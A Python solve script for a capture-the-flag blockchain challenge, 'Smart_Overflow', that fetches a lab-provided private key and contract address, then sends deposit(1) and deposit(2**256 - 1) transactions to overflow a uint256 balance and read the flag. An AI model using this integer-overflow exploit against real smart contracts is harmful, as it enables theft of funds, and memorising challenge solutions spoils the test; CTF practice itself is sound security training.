#!/usr/bin/env python3
"""
Solve script for Smart_Overflow (#760)
Category: Blockchain
"""
import sys
import json
import urllib.request
import re
from web3 import Web3

def solve():
    print("[*] Solving Smart_Overflow...")
    sys.stdout.reconfigure(encoding='utf-8')

    # Fetch configuration from the web page
    web_url = "http://chatelaine.cylabacademy.net:48322/"
    req = urllib.request.urlopen(web_url)
    html = req.read().decode("utf-8")

    def extract_id(tag_id):
        m = re.search(rf'id=["\']{tag_id}["\'][^>]*>(.*?)</', html)
        return m.group(1).strip() if m else None

    contract_addr = extract_id("contract-address")
    player_addr = extract_id("player-address")
    player_priv = extract_id("player-priv")

    print(f"[*] Contract Address: {contract_addr}")
    print(f"[*] Player Address:   {player_addr}")
    print(f"[*] Player PrivKey:   {player_priv[:10]}...")

    rpc_url = "http://chatelaine.cylabacademy.net:15697"
    w3 = Web3(Web3.HTTPProvider(rpc_url))
    assert w3.is_connected(), "Failed to connect to Ethereum node"

    contract_addr = Web3.to_checksum_address(contract_addr)
    player_addr = Web3.to_checksum_address(player_addr)

    abi = [
        {
            "inputs": [{"internalType": "uint256", "name": "amount", "type": "uint256"}],
            "name": "deposit",
            "outputs": [],
            "stateMutability": "nonpayable",
            "type": "function"
        },
        {
            "inputs": [],
            "name": "getFlag",
            "outputs": [{"internalType": "string", "name": "", "type": "string"}],
            "stateMutability": "view",
            "type": "function"
        },
        {
            "inputs": [],
            "name": "revealed",
            "outputs": [{"internalType": "bool", "name": "", "type": "bool"}],
            "stateMutability": "view",
            "type": "function"
        },
        {
            "inputs": [{"internalType": "address", "name": "", "type": "address"}],
            "name": "balances",
            "outputs": [{"internalType": "uint256", "name": "", "type": "uint256"}],
            "stateMutability": "view",
            "type": "function"
        }
    ]

    contract = w3.eth.contract(address=contract_addr, abi=abi)

    revealed = contract.functions.revealed().call()
    print(f"[*] Initial revealed state: {revealed}")

    if not revealed:
        nonce = w3.eth.get_transaction_count(player_addr)
        chain_id = w3.eth.chain_id

        # Step 1: Deposit 1
        print("[*] Sending Tx 1: deposit(1)...")
        tx1 = contract.functions.deposit(1).build_transaction({
            'from': player_addr,
            'nonce': nonce,
            'gas': 100000,
            'gasPrice': w3.eth.gas_price,
            'chainId': chain_id
        })
        signed_tx1 = w3.eth.account.sign_transaction(tx1, player_priv)
        tx_hash1 = w3.eth.send_raw_transaction(signed_tx1.raw_transaction)
        receipt1 = w3.eth.wait_for_transaction_receipt(tx_hash1)
        print(f"[+] Tx 1 confirmed in block {receipt1.blockNumber}")

        nonce += 1

        # Step 2: Deposit 2^256 - 1 to cause uint256 overflow (1 + 2^256 - 1 == 0 mod 2^256)
        print("[*] Sending Tx 2: deposit(2**256 - 1)...")
        overflow_amount = (1 << 256) - 1
        tx2 = contract.functions.deposit(overflow_amount).build_transaction({
            'from': player_addr,
            'nonce': nonce,
            'gas': 100000,
            'gasPrice': w3.eth.gas_price,
            'chainId': chain_id
        })
        signed_tx2 = w3.eth.account.sign_transaction(tx2, player_priv)
        tx_hash2 = w3.eth.send_raw_transaction(signed_tx2.raw_transaction)
        receipt2 = w3.eth.wait_for_transaction_receipt(tx_hash2)
        print(f"[+] Tx 2 confirmed in block {receipt2.blockNumber}")

    revealed = contract.functions.revealed().call()
    print(f"[*] Revealed state after exploit: {revealed}")

    flag = contract.functions.getFlag().call()
    print(f"[+] Flag retrieved from contract: {flag}")

    # Also check /status endpoint
    try:
        status_req = urllib.request.urlopen("http://chatelaine.cylabacademy.net:48322/status")
        status_data = json.loads(status_req.read().decode("utf-8"))
        print(f"[+] Status endpoint: {status_data}")
    except Exception as e:
        print(f"[-] Status endpoint check failed: {e}")

    with open("flag.txt", "w", encoding="utf-8") as f:
        f.write(flag + "\n")

    return flag

if __name__ == "__main__":
    solve()
